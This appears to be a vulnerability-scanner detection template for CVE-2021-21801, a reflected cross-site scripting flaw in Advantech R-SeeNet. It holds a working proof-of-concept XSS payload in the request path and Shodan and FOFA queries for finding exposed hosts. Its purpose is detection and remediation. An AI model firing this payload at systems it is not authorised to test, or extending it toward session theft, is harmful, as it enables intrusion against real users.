http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"zlo onerror=alert(1) "'
    - Device Status Graph
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22'
id: CVE-2021-21801
info:
  author: gy741
  classification:
    cpe: cpe:2.3:a:advantech:r-seenet:2.4.12:*:*:*:*:*:*:*
    cve-id: CVE-2021-21801
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.99287
    epss-score: 0.84598
  description: Advantech R-SeeNet contains a cross-site scripting vulnerability in
    the device_graph_page.php script via the graph parameter. A specially crafted
    URL by an attacker can lead to arbitrary JavaScript code execution.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: body="r-seenet"
    max-request: 1
    product: r-seenet
    shodan-query: http.html:"r-seenet"
    vendor: advantech
  name: Advantech R-SeeNet - Cross-Site Scripting
  reference:
  - https://talosintelligence.com/vulnerability_reports/TALOS-2021-1272
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21801
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches or updates provided by Advantech
    to fix the XSS vulnerability in the R-SeeNet application.

    '
  severity: medium
  tags: cve2021,cve,rseenet,xss,graph,advantech,vkev,vuln
